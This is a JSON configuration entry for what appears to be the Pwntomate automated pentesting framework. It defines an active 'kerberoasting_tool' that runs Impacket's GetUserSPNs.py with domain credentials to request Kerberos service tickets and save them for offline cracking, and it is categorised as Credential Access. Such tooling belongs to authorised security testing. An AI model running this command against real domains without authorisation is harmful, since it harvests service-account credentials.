{
  "toolname": "kerberoasting_tool",
  "command": "GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip} -request -outputfile {outputdir}/spns.txt > {outputdir}/kerberoast.txt",
  "trigger": [
    "kerberos-sec"
  ],
  "active": true,
  "category": "07. Credential Access",
  "description": "Pwntomate tool: kerberoasting_tool \u2014 triggers on ['kerberos-sec']"
}